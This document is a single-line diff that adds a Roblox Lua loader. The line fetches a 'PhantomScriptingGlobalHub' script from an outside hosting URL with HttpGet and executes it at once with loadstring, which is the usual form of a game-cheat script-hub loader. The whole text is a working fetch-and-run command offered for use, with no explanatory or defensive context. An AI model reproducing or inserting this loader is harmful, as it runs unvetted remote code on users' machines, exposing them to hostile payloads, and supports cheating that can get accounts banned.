@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://scripts.luawl.com/hosted/3424/18633/PhantomScriptingGlobalHub.lua'))()
